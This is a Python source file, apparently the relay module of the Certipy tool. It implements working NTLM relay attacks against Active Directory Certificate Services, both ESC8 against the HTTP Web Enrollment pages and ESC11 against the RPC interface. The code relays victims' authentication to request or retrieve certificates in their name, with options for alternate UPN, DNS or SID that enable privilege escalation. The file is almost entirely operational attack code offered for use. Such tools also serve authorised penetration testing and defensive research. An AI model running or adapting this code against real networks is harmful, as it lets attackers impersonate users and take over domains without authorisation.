"""
Certificate Relay Attack Module for Certipy.

This module implements NTLM relay attacks against Active Directory Certificate Services (AD CS):
- ESC8: NTLM relay to AD CS HTTP endpoints (Web Enrollment)
- ESC11: NTLM relay to AD CS RPC endpoints (MS-ICPR)

The attacks allow an attacker to obtain certificates for other users by relaying
their NTLM authentication to an AD CS server, which can then be used for privilege
escalation or persistence.

Key Components:
- Relay: Main class orchestrating the relay attack
- ADCSHTTPRelayServer: Relays HTTP authentication to AD CS Web Enrollment
- ADCSRPCRelayServer: Relays RPC authentication to AD CS Certificate Services
- ADCSHTTPAttackClient: Handles certificate requests via HTTP
- ADCSRPCAttackClient: Handles certificate requests via RPC
"""

import argparse
import base64
import os
import struct
import time
from struct import unpack
from threading import Lock
from typing import Any, List, Literal, Optional, Tuple, Union, cast

import bs4
import httpx
from cryptography.hazmat.primitives.asymmetric import rsa
from impacket.dcerpc.v5 import epm
from impacket.examples import logger as _impacket_logger
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from impacket.examples.ntlmrelayx.clients import rpcrelayclient
from impacket.examples.ntlmrelayx.clients.httprelayclient import HTTPRelayClient
from impacket.examples.ntlmrelayx.servers import SMBRelayServer
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
from impacket.ntlm import NTLMAuthChallenge, NTLMAuthChallengeResponse
from impacket.spnego import SPNEGO_NegTokenResp

from certipy.lib.certificate import (
    create_csr,
    create_csr_attributes,
    create_key_archival,
    csr_to_der,
    csr_to_pem,
    der_to_cert,
)
from certipy.lib.constants import OID_TO_STR_NAME_MAP, USER_AGENT
from certipy.lib.errors import handle_error
from certipy.lib.logger import logging
from certipy.lib.req import (
    MSRPC_UUID_ICPR,
    Request,
    RPCRequestInterface,
    handle_request_response,
    handle_retrieve,
    web_request,
    web_retrieve,
)
from certipy.lib.target import DnsResolver, Target


class ADCSHTTPRelayServer(HTTPRelayClient):
    """
    HTTP relay client for AD CS Web Enrollment interface.

    This class relays NTLM authentication to AD CS Web Enrollment services,
    allowing an attacker to request certificates on behalf of the relayed user.
    """

    def __init__(self, adcs_relay: "Relay", *args, **kwargs):  # type: ignore
        """
        Initialize the HTTP relay server.

        Args:
            adcs_relay: The parent Relay object
            args: Arguments to pass to the parent class
            kwargs: Keyword arguments to pass to the parent class
        """
        super().__init__(*args, **kwargs)
        self.adcs_relay = adcs_relay

    def initConnection(self) -> Literal[True]:  # noqa: N802
        """
        Establish a connection to the AD CS Web Enrollment service.

        Returns:
            True if connection was successful
        """
        logging.debug(f"Using target: {self.adcs_relay.target}...")
        logging.debug(f"Base URL: {self.adcs_relay.base_url}")
        logging.debug(f"Path: {self.target.path}")
        logging.debug(f"Using timeout: {self.adcs_relay.timeout}")

        self.session = httpx.Client(
            base_url=self.adcs_relay.base_url,
            verify=False,
            timeout=self.adcs_relay.timeout,
            headers={
                "User-Agent": USER_AGENT,
            },
        )

        self.lastresult = None

        # Prepare the target path
        if self.target.path == "":
            self.path = "/"
        else:
            self.path = self.target.path

        logging.debug(f"Using path: {self.target.path}")
        logging.debug(f"Using path: {self.path}")

        return True

    def sendNegotiate(  # noqa: N802 # type: ignore
        self, negotiate_message: bytes
    ) -> Optional[NTLMAuthChallenge]:
        # Check if server wants auth
        res = self.session.get(self.path)

        if res.status_code != 401:
            logging.info(
                "Status code returned: %d. Authentication does not seem required for URL"
                % res.status_code
            )

        authenticate_header = res.headers.get("WWW-Authenticate", None)
        if authenticate_header is None:
            logging.error(
                "No authentication requested by the server for url %s. Sending NTLM auth anyways"
                % self.adcs_relay.target
            )
            self.authenticationMethod = "NTLM"
        else:
            authenticate_header = authenticate_header.lower()
            if "ntlm" in authenticate_header:
                self.authenticationMethod = "NTLM"
            elif "negotiate" in authenticate_header:
                self.authenticationMethod = "Negotiate"
            else:
                logging.error(
                    "Neither NTLM nor Negotiate auth offered by URL, offered protocols: %s"
                    % authenticate_header
                )
                return None

        # Negotiate auth
        negotiate = base64.b64encode(negotiate_message).decode()
        headers = {"Authorization": f"{self.authenticationMethod} {negotiate}"}
        res = self.session.get(self.path, headers=headers)

        if res.status_code != 401:
            logging.error("Got unauthorized response from AD CS")
            return None

        # Check for NTLM challenge in the response
        authenticate_header = res.headers.get("WWW-Authenticate", None)
        if authenticate_header is None:
            logging.error("No authentication challenge returned from server")
            return None

        # Extract the server challenge from the authentication header
        try:
            # Find the challenge portion of the header
            server_challenge_base64 = next(
                s.strip()[len(self.authenticationMethod) :]
                for s in (val.lstrip() for val in authenticate_header.split(","))
                if s.startswith(self.authenticationMethod)
            ).strip()
        except Exception:
            logging.error(
                f"Failed to parse authentication header: {authenticate_header}"
            )
            handle_error()
            return None

        # Decode the challenge
        try:
            server_challenge = base64.b64decode(server_challenge_base64)
        except Exception as e:
            logging.error(
                f"Failed to decode server challenge: {authenticate_header} - {e}"
            )
            handle_error()
            return None

        # Check if challenge is wrapped in SPNEGO
        if (
            server_challenge
            and struct.unpack("B", server_challenge[:1])[0]
            == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP
        ):
            resp = SPNEGO_NegTokenResp(server_challenge)
            type2 = resp["ResponseToken"]
        else:
            type2 = server_challenge

        # Parse Type 2 message
        challenge = NTLMAuthChallenge()
        try:
            challenge.fromString(type2)
            return challenge
        except Exception as e:
            logging.error(
                f"Failed to parse server challenge: {authenticate_header} - {e}"
            )
            handle_error()

        return None

    def sendAuth(  # noqa: N802 # type: ignore
        self, authenticate_blob: bytes, _server_challenge: Optional[bytes] = None
    ) -> Tuple[Optional[bytes], int]:
        """
        Send authentication data to the target with proper locking to prevent race conditions.

        Args:
            authenticateMessageBlob: The authentication message
            serverChallenge: The server challenge

        Returns:
            Tuple of (response, status code)
        """
        while not self.adcs_relay.attack_lock.acquire():
            time.sleep(0.1)

        response = None, STATUS_ACCESS_DENIED

        try:
            response = self._send_auth(authenticate_blob)
        except Exception as e:
            logging.error(f"Failed to authenticate: {e}")
            handle_error()
            response = None, STATUS_ACCESS_DENIED
        finally:
            self.adcs_relay.attack_lock.release()
            return response

    def _send_auth(self, authenticate_blob: bytes) -> Tuple[Optional[bytes], int]:
        """
        Process and send authentication data to the target.

        Args:
            authenticateMessageBlob: The authentication message
            serverChallenge: The server challenge

        Returns:
            Tuple of (response, status code)
        """
        # Extract the NTLM token from SPNEGO if needed
        if (
            unpack("B", authenticate_blob[:1])[0]
            == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP
        ):
            resp = SPNEGO_NegTokenResp(authenticate_blob)
            token = resp["ResponseToken"]
        else:
            token = authenticate_blob

        # Parse NTLM authentication response
        response = NTLMAuthChallengeResponse()
        response.fromString(data=token)

        # Extract domain and username from response
        # TODO: Support unicode
        domain = response["domain_name"].decode("utf-16le")
        username = response["user_name"].decode("utf-16le")

        # Store the authenticated user for later use
        self.session.user = f"{domain}\\{username}"  # type: ignore

        # Build authorization header with NTLM token
        auth = base64.b64encode(token).decode()
        headers = {"Authorization": f"{self.authenticationMethod} {auth}"}

        # Make authenticated request to AD CS
        res = self.session.get(self.path, headers=headers)

        if res.status_code == 401:
            logging.error("Got unauthorized response from AD CS")
            return None, STATUS_ACCESS_DENIED
        else:
            logging.debug(
                f"HTTP server returned status code {res.status_code}, treating as successful login"
            )
            # Cache the response
            self.lastresult = res.read()
            return None, STATUS_SUCCESS


class ADCSRPCRelayServer(rpcrelayclient.RPCRelayClient, rpcrelayclient.ProtocolClient):  # type: ignore
    """
    RPC relay client for AD CS Certificate Services interface.

    This class relays NTLM authentication to AD CS RPC endpoints (MS-ICPR),
    allowing an attacker to request certificates on behalf of the relayed user.
    """

    def __init__(
        self,
        config: NTLMRelayxConfig,
        target: object,
        targetPort: Optional[int] = None,  # noqa: N803
        extendedSecurity: bool = True,  # noqa: N803
    ):
        """
        Initialize the RPC relay server.

        Args:
            serverConfig: NTLMRelayxConfig object with relay settings
            target: Target information
            targetPort: Target RPC port (default: uses port mapping)
            extendedSecurity: Whether to use extended security
        """
        rpcrelayclient.ProtocolClient.__init__(
            self, config, target, targetPort, extendedSecurity
        )

        # Set up RPC endpoint details
        self.endpoint = "ICPR"
        self.endpoint_uuid = MSRPC_UUID_ICPR

        netloc: str = target.netloc  # type: ignore

        # Find the appropriate RPC binding string
        logging.info(
            f"Connecting to ncacn_ip_tcp:{netloc}[135] to determine {self.endpoint} stringbinding"
        )
        self.stringbinding = epm.hept_map(
            netloc, self.endpoint_uuid, protocol="ncacn_ip_tcp"
        )

        logging.debug(f"{self.endpoint} stringbinding is {self.stringbinding}")

    def sendAuth(  # noqa: N802 # type: ignore
        self, authenticate_blob: bytes, server_challenge: Optional[bytes] = None
    ) -> Tuple[Optional[bytes], int]:
        """
        Send authentication data to the target RPC service.

        Args:
            authenticateMessageBlob: The authentication message
            serverChallenge: The server challenge

        Returns:
            Tuple of (response, status code)
        """
        # Extract the NTLM token from SPNEGO if needed
        if (
            unpack("B", authenticate_blob[:1])[0]
            == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP
        ):
            resp = SPNEGO_NegTokenResp(authenticate_blob)
            auth_data = resp["ResponseToken"]
        else:
            auth_data = authenticate_blob

        # Send the authentication data to the target
        self.session.sendBindType3(auth_data)  # type: ignore

        # Test if authentication was successful by sending a dummy request
        try:
            req = rpcrelayclient.DummyOp()
            self.session.request(req)  # type: ignore
            return None, STATUS_SUCCESS
        except rpcrelayclient.DCERPCException as e:
            # Expected error codes for successful auth but invalid operation
            if "nca_s_op_rng_error" in str(e) or "RPC_E_INVALID_HEADER" in str(e):
                return None, STATUS_SUCCESS
            elif "rpc_s_access_denied" in str(e):
                return None, STATUS_ACCESS_DENIED
            else:
                logging.info(f"Unexpected RPC error from {self.stringbinding}: {e}")
                return None, STATUS_ACCESS_DENIED
        except Exception as e:
            logging.info(f"Unexpected error from {self.stringbinding}: {e}")
            return None, STATUS_ACCESS_DENIED


class ADCSHTTPAttackClient(ProtocolAttack):
    """
    Attack client for HTTP-based AD CS certificate requests.

    This class handles certificate operations via the Web Enrollment interface.
    """

    def __init__(self, adcs_relay: "Relay", *args, **kwargs):  # type: ignore
        """
        Initialize the HTTP attack client.

        Args:
            adcs_relay: The parent Relay object
            args: Arguments to pass to the parent class
            kwargs: Keyword arguments to pass to the parent class
        """
        super().__init__(*args, **kwargs)
        self.adcs_relay = adcs_relay

    def run(self) -> None:  # type: ignore
        """
        Execute the certificate request attack with proper locking.
        """
        while not self.adcs_relay.attack_lock.acquire():
            time.sleep(0.1)

        try:
            self._run()
        except Exception as e:
            logging.error(f"Failed to run attack: {e}")
            handle_error()
        finally:
            self.adcs_relay.attack_lock.release()

    def _run(self) -> None:
        """
        Main attack logic - request or retrieve a certificate for the relayed user.
        """
        # Check if we've already attacked this target and should skip
        if (
            not self.adcs_relay.no_skip
            and self.client.user in self.adcs_relay.attacked_targets
        ):
            logging.debug(
                f"Skipping user {self.client.user!r} since attack was already performed"
            )
            return

        # Handle template enumeration mode
        if self.adcs_relay.enum_templates:
            self._enumerate_templates()
            return

        # Handle certificate retrieval or request
        request_id = self.adcs_relay.request_id
        if request_id:
            self._retrieve_certificate(request_id)
        else:
            self._request_certificate()

    def _enumerate_templates(self) -> None:
        """
        Enumerate available certificate templates from Web Enrollment.
        """

        # Request the certificate request page
        res = self.client.get("/certsrv/certrqxt.asp")
        content = res.text

        # Parse the HTML to extract templates
        soup = bs4.BeautifulSoup(content, "html.parser")

        select_tag = cast(
            Optional[bs4.Tag],
            soup.find("select", {"name": "lbCertTemplate", "id": "lbCertTemplateID"}),
        )

        if select_tag:
            option_tags = select_tag.find_all("option")
            print(f"Templates Found for {self.client.user!r}:")
            for option in option_tags:
                if not isinstance(option, bs4.Tag):
                    continue

                value = option["value"]

                if not isinstance(value, str):
                    logging.warning(
                        f"Got unexpected value type {type(value)} for template {option.text}: {value!r}"
                    )
                    continue

                split_value = value.split(";")
                if len(split_value) > 1:
                    print(split_value[1])

        return self.finish_run()

    def _retrieve_certificate(self, request_id: int) -> None:
        """
        Retrieve a certificate by request ID.

        Args:
            request_id: The ID of the certificate request to retrieve
        """
        result = web_retrieve(
            self.client,
            request_id,
        )

        if result is not None:
            handle_retrieve(
                result,
                request_id,
                self.client.user,
                self.adcs_relay.out,
                self.adcs_relay.pfx_password,
            )

        return self.finish_run()

    def _request_certificate(self) -> None:
        """
        Request a new certificate for the relayed user.
        """
        # Choose appropriate template based on username
        template = self.config.template
        if template is None:
            template = "Machine" if self.username.endswith("$") else "User"

        # Generate certificate signing request
        csr, key = create_csr(
            self.username,
            alt_dns=self.adcs_relay.alt_dns,
            alt_upn=self.adcs_relay.alt_upn,
            alt_sid=self.adcs_relay.alt_sid,
            subject=self.adcs_relay.subject,
            key_size=self.adcs_relay.key_size,
            application_policies=self.adcs_relay.application_policies,
            smime=self.adcs_relay.smime,
        )

        # Handle key archival if specified
        if self.adcs_relay.archive_key:
            logging.info(
                f"Trying to retrieve CAX certificate from file {self.adcs_relay.archive_key}"
            )
            with open(self.adcs_relay.archive_key, "rb") as f:
                cax_cert = f.read()
                cax_cert = der_to_cert(cax_cert)
                logging.info("Retrieved CAX certificate")

            csr = create_key_archival(csr, key, cax_cert)
            csr = base64.b64encode(csr).decode()
            csr = f"-----BEGIN PKCS7-----\n{csr}\n-----END PKCS7-----"
        else:
            csr = csr_to_pem(csr).decode()

        # Build certificate attributes
        attributes = create_csr_attributes(
            template,
            alt_dns=self.adcs_relay.alt_dns,
            alt_upn=self.adcs_relay.alt_upn,
            alt_sid=self.adcs_relay.alt_sid,
        )

        result = web_request(
            self.client,
            self.client.user,
            csr,
            attributes,
            template,
            key,
            self.adcs_relay.out,
        )

        if result is not None:
            handle_request_response(
                result,
                key,
                self.client.user,
                self.adcs_relay.subject,
                self.adcs_relay.alt_sid,
                self.adcs_relay.out,
                self.adcs_relay.pfx_password,
            )

        return self.finish_run()

    def finish_run(self) -> None:
        """
        Clean up after attack completion.
        """
        self.adcs_relay.attacked_targets.append(self.client.user)
        if not self.adcs_relay.forever:
            self.adcs_relay.shutdown()


class ADCSRPCAttackClient(ProtocolAttack):
    """
    Attack client for RPC-based AD CS certificate requests.

    This class handles certificate operations via the RPC interface.
    """

    def __init__(
        self, adcs_relay: "Relay", config: NTLMRelayxConfig, dce: Any, username: str
    ):
        """
        Initialize the RPC attack client.

        Args:
            adcs_relay: The parent Relay object
            config: NTLMRelayxConfig object with relay settings
            dce: DCE/RPC connection
            username: Username of the relayed user
        """
        super().__init__(config, dce, username)

        self.adcs_relay = adcs_relay
        self.dce = dce
        self.rpctransport = dce.get_rpc_transport()
        self.stringbinding = self.rpctransport.get_stringbinding()

        # Parse domain and username
        try:
            if "/" in username:
                self.domain, self.username = username.split("/")
            else:
                self.domain, self.username = "Unknown", username
        except Exception as e:
            logging.error(f"Error parsing username {username}: {e}")
            handle_error()
            self.domain, self.username = "Unknown", username

    def run(self) -> None:  # type: ignore
        """
        Execute the certificate request attack with proper locking.
        """
        while not self.adcs_relay.attack_lock.acquire():
            time.sleep(0.1)

        # Initialize RPC interface
        self.interface = RPCRequestInterface(parent=self.adcs_relay.request)
        self.interface._dce = self.dce

        try:
            self._run()
        except Exception as e:
            logging.error(f"Failed to run attack: {e}")
            handle_error()
        finally:
            self.adcs_relay.attack_lock.release()

    def _run(self) -> None:
        """
        Main attack logic - request or retrieve a certificate for the relayed user.
        """
        # Check if we've already attacked this target and should skip
        full_username = f"{self.username}@{self.domain}"
        if (
            not self.adcs_relay.no_skip
            and full_username in self.adcs_relay.attacked_targets
        ):
            logging.info(
                f"Skipping user {full_username!r} since attack was already performed"
            )
            return

        logging.info(f"Attacking user {full_username!r}")

        # Handle certificate retrieval or request
        request_id = self.adcs_relay.request_id
        if request_id:
            _ = self.retrieve()
        else:
            _ = self.request()

        self.finish_run()

    def retrieve(self) -> bool:
        """
        Retrieve a certificate by request ID.

        Returns:
            True on success, False on failure
        """
        if self.adcs_relay.request_id is None:
            logging.error("Request ID was not defined")
            return False

        request_id = int(self.adcs_relay.request_id)
        logging.info(f"Retrieving certificate for request id {request_id}")

        cert = self.interface.retrieve(request_id)
        if cert is None:
            logging.error("Failed to retrieve certificate")
            return False

        return handle_retrieve(
            cert,
            request_id,
            self.username,
            out=self.adcs_relay.out,
            pfx_password=self.adcs_relay.pfx_password,
        )

    def request(self) -> Union[bool, Tuple[bytes, str]]:
        """
        Request a new certificate for the relayed user.

        Returns:
            Tuple of (PFX data, filename) on success, False on failure
        """
        # Choose appropriate template based on username
        template = self.config.template
        if template is None:
            logging.info("Template was not defined. Defaulting to Machine/User")
            template = "Machine" if self.username.endswith("$") else "User"

        logging.info(
            f"Requesting certificate for user {self.username!r} with template {template!r}"
        )

        # Generate certificate signing request
        csr, key = create_csr(
            self.username,
            alt_dns=self.adcs_relay.alt_dns,
            alt_upn=self.adcs_relay.alt_upn,
            alt_sid=self.adcs_relay.alt_sid,
            subject=self.adcs_relay.subject,
            key_size=self.adcs_relay.key_size,
            application_policies=self.adcs_relay.application_policies,
            smime=self.adcs_relay.smime,
        )
        self.interface.parent.key = key

        # Handle key archival if specified
        if self.adcs_relay.archive_key:
            logging.info(
                f"Trying to retrieve CAX certificate from file {self.adcs_relay.archive_key}"
            )
            with open(self.adcs_relay.archive_key, "rb") as f:
                cax_cert = f.read()
                cax_cert = der_to_cert(cax_cert)
                logging.info("Retrieved CAX certificate")

            csr_data = create_key_archival(csr, key, cax_cert)
        else:
            csr_data = csr_to_der(csr)

        # Build certificate attributes
        attributes = create_csr_attributes(
            template,
            alt_dns=self.adcs_relay.alt_dns,
            alt_upn=self.adcs_relay.alt_upn,
            alt_sid=self.adcs_relay.alt_sid,
        )

        # Submit certificate request
        cert = self.interface.request(csr_data, attributes)

        if cert is None:
            logging.error("Failed to request certificate")
            return False

        return handle_request_response(
            cert,
            key,
            self.username,
            self.adcs_relay.subject,
            self.adcs_relay.alt_sid,
            self.adcs_relay.out,
            self.adcs_relay.pfx_password,
        )

    def finish_run(self) -> None:
        """
        Clean up after attack completion.
        """
        self.adcs_relay.attacked_targets.append(f"{self.username}@{self.domain}")
        if not self.adcs_relay.forever:
            self.adcs_relay.shutdown()


class Relay:
    """
    Main class for orchestrating NTLM relay attacks against AD CS.

    This class coordinates the relay servers and attack clients to obtain
    certificates by relaying NTLM authentication.
    """

    def __init__(
        self,
        target: str,
        ca: Optional[str] = None,
        template: Optional[str] = None,
        upn: Optional[str] = None,
        dns: Optional[str] = None,
        sid: Optional[str] = None,
        subject: Optional[str] = None,
        application_policies: Optional[List[str]] = None,
        smime: Optional[str] = None,
        archive_key: Optional[str] = None,
        pfx_password: Optional[str] = None,
        retrieve: Optional[int] = None,
        key_size: int = 2048,
        out: Optional[str] = None,
        interface: str = "0.0.0.0",
        port: int = 445,
        forever: bool = False,
        no_skip: bool = False,
        timeout: int = 5,
        enum_templates: bool = False,
        **kwargs,  # type: ignore
    ):
        """
        Initialize the NTLM relay attack.

        Args:
            target: Target AD CS server (http://server/certsrv/ or rpc://server)
            ca: Certificate Authority name (required for RPC)
            template: Certificate template to request
            upn: Alternative UPN (User Principal Name)
            dns: Alternative DNS name
            sid: Alternative SID (Security Identifier)
            subject: Certificate subject name
            application_policies: List of application policy OIDs
            smime: SMIME capability identifier
            archive_key: Path to CAX certificate for key archival
            pfx_password: Password for PFX file
            retrieve: Request ID to retrieve instead of requesting a new certificate
            key_size: RSA key size in bits
            out: Output file base name
            interface: Network interface to listen on
            port: Port to listen on for NTLM relay
            forever: Continue listening for new connections after successful attack
            no_skip: Don't skip already attacked targets
            timeout: Connection timeout in seconds
            enum_templates: Enumerate available templates instead of requesting certificate
            kwargs: Additional arguments
        """
        self.target = target
        self.base_url = target  # Used only for HTTP(S) targets
        self.ca = ca
        self.template = template
        self.alt_upn = upn
        self.alt_dns = dns
        self.alt_sid = sid
        self.subject = subject
        self.archive_key = archive_key
        self.pfx_password = pfx_password
        self.request_id = int(retrieve) if retrieve else None
        self.key_size = key_size
        self.out = out
        self.forever = forever
        self.no_skip = no_skip
        self.timeout = timeout
        self.interface = interface
        self.port = port
        self.enum_templates = enum_templates
        self.kwargs = kwargs
        self.key: Optional[rsa.RSAPrivateKey] = None

        # Convert application policy names to OIDs
        self.application_policies = [
            OID_TO_STR_NAME_MAP.get(policy.lower(), policy)
            for policy in (application_policies or [])
        ]
        self.smime = smime

        self._request: Optional[Request] = None

        self.attacked_targets = []
        self.attack_lock = Lock()

        # Configure target based on URL or RPC string
        if self.target.startswith("rpc://"):
            if ca is None:
                logging.error("A certificate authority is required for RPC attacks")
                exit(1)

            logging.info(f"Targeting {target} (ESC11)")
        else:
            # Format HTTP target URL
            if not self.target.startswith("http://") and not self.target.startswith(
                "https://"
            ):
                self.target = f"http://{self.target}"
            if not self.target.endswith("/certsrv/certfnsh.asp"):
                if not self.target.endswith("/"):
                    self.target += "/"

                if self.enum_templates:
                    self.target += "certsrv/certrqxt.asp"
                else:
                    self.target += "certsrv/certfnsh.asp"
            logging.info(f"Targeting {self.target} (ESC8)")

            url = httpx.URL(self.target)

            if not url.is_absolute_url:
                logging.error(
                    f"Invalid target URL. Expected format: http(s)://server/path, got {self.target}"
                )
                exit(1)

            self.base_url = f"{url.scheme}://{url.host}"

        # Configure impacket relay target
        target_processor = TargetsProcessor(
            singleTarget=self.target,
            protocolClients={
                "HTTP": self.get_relay_http_server,
                "HTTPS": self.get_relay_http_server,
                "RPC": self.get_relay_rpc_server,
            },
        )

        # Configure relay
        config = NTLMRelayxConfig()
        config.setTargets(target_processor)
        config.setDisableMulti(True)
        config.setIsADCSAttack(True)
        config.setADCSOptions(self.template)
        config.setAttacks(
            {
                "HTTP": self.get_attack_http_client,
                "HTTPS": self.get_attack_http_client,
                "RPC": self.get_attack_rpc_client,
            }
        )
        config.setProtocolClients(
            {
                "HTTP": self.get_relay_http_server,
                "HTTPS": self.get_relay_http_server,
                "RPC": self.get_relay_rpc_server,
            }
        )
        config.setListeningPort(port)
        config.setInterfaceIp(interface)
        config.setSMB2Support(True)
        config.setMode("RELAY")

        self.server = SMBRelayServer(config)

    @property
    def request(self) -> Request:
        """
        Get the current request object.

        Returns:
            The current request object
        """
        if not self._request is None:
            return self._request

        self._request = Request(
            Target(
                DnsResolver.create(),
                timeout=self.timeout,
            ),
            ca=self.ca,
            template=self.template or "",
            upn=self.alt_upn,
            dns=self.alt_dns,
            sid=self.alt_sid,
            key_size=self.key_size,
            retrieve=self.request_id,
            out=self.out,
        )

        return self._request

    def start(self) -> None:
        """
        Start the relay server and wait for connections.
        """
        logging.info(f"Listening on {self.interface}:{self.port}")
        self.server.start()

        try:
            # Main loop - wait for connections
            while True:
                time.sleep(0.1)
        except KeyboardInterrupt:
            print("")
            self.shutdown()
        except Exception as e:
            logging.error(f"Received error while running relay server: {e}")
            handle_error()

    def get_relay_http_server(self, *args, **kwargs) -> ADCSHTTPRelayServer:  # type: ignore
        """
        Factory method to create an HTTP relay server.

        Returns:
            Configured HTTP relay server
        """
        return ADCSHTTPRelayServer(self, *args, **kwargs)

    def get_attack_http_client(self, *args, **kwargs) -> ADCSHTTPAttackClient:  # type: ignore
        """
        Factory method to create an HTTP attack client.

        Returns:
            Configured HTTP attack client
        """
        return ADCSHTTPAttackClient(self, *args, **kwargs)

    def get_relay_rpc_server(self, *args, **kwargs) -> ADCSRPCRelayServer:  # type: ignore
        """
        Factory method to create an RPC relay server.

        Returns:
            Configured RPC relay server
        """
        return ADCSRPCRelayServer(*args, **kwargs)

    def get_attack_rpc_client(self, *args, **kwargs) -> ADCSRPCAttackClient:  # type: ignore
        """
        Factory method to create an RPC attack client.

        Returns:
            Configured RPC attack client
        """
        return ADCSRPCAttackClient(self, *args, **kwargs)

    def shutdown(self) -> None:
        """
        Gracefully shut down the relay server.
        """
        logging.info("Exiting...")
        os._exit(0)


def entry(options: argparse.Namespace) -> None:
    """
    Command-line entry point for relay functionality.

    Args:
        options: Command line arguments
    """
    # Initialize logging from Impacket
    _impacket_logger.init()

    relay = Relay(**vars(options))
    relay.start()
